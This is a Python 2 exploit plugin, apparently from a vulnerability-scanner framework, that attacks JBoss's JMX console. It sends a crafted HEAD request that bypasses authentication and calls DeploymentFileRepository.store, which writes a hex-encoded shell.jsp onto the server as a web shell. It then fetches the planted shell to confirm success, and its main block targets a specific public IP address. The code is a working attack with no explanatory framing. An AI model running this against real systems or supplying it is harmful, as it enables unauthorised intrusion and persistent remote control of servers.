#coding:utf-8
from t import T
import urllib2
import socket
import time
import random
def random_str(len): 
    str1="" 
    for i in range(len): 
        str1+=(random.choice("ABCDEFGH")) 
    return str1

def readfile(path):
    data=None
    file_object = open(path)
    try:
        data = file_object.read( )
    finally:
        file_object.close( )
    return data



class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=3
        target_url = 'http://'+ip+':'+port
        result = {}
        result['result']=False
        res=None
        s1=None
        shell=''
        try:
            socket.setdefaulttimeout(timeout)
            s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s1.connect((ip,int(port)))
            import os
            shell=readfile(os.path.split(os.path.realpath(__file__))[0]+'/shell.jsp')
        #s1.recv(1024)        
            shellcode=""
            name=random_str(5)
            for v in shell:
                shellcode+=hex(ord(v)).replace("0x","%")
            flag="HEAD /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType="+\
            "java.lang.String&arg0=%s.war&argType=java.lang.String&arg1=auto700&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3="%(name)+shellcode+\
            "&argType=boolean&arg4=True HTTP/1.0\r\n\r\n"
            s1.send(flag)
            data = s1.recv(512)
            s1.close()
            time.sleep(10)
            url = "http://%s:%d"%(ip,int(port))
            webshell_url = "%s/%s/auto700.jsp"%(url,name)
            res = urllib2.urlopen(webshell_url,timeout=timeout)
            if 'comments' in res.read():
                info="Jboss Authentication bypass webshell:%s"%(webshell_url)
                result['result']=True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type']='Jboss Authentication bypass webshell'
                result['VerifyInfo']['URL'] =target_url
                result['VerifyInfo']['payload']=webshell_url
                result['VerifyInfo']['result'] =info
                result['VerifyInfo']['level'] = 'hole'
        except Exception,e:
            print e
    
        finally:
            if res is not None:
                res.close()
            if s1 is not None:
                s1.close
            del shell
            return result

           

if __name__ == '__main__':
    print P().verify(ip='1.202.164.105',port='8080')      